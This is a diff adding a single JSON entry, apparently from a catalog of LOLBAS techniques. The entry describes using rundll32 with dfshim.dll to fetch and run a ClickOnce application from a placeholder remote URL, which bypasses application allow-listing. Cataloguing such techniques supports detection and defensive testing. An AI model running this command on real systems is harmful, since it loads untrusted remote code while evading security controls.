@@ -1,0 +1,23 @@
+{
+  "id": "lolbas-dfsvc-exe-awl-bypass",
+  "name": "LOLBAS · Dfsvc.exe (AWL Bypass)",
+  "command": "rundll32.exe dfshim.dll,ShOpenVerbApplication {REMOTEURL}",
+  "description": "Executes click-once-application from Url (trampoline for Dfsvc.exe, DotNet ClickOnce host)",
+  "platform": "windows",
+  "tags": [
+    "lolbas",
+    "dfsvc",
+    "awl-bypass"
+  ],
+  "source": "lolbas",
+  "source_url": "https://lolbas-project.github.io/lolbas/Dfsvc/",
+  "upstream_id": "Dfsvc.exe/AWL Bypass/0",
+  "category": "lolbas",
+  "subcategory": "awl-bypass",
+  "references": [
+    {
+      "title": "LOLBAS — Dfsvc.exe",
+      "url": "https://lolbas-project.github.io/lolbas/Dfsvc/"
+    }
+  ]
+}
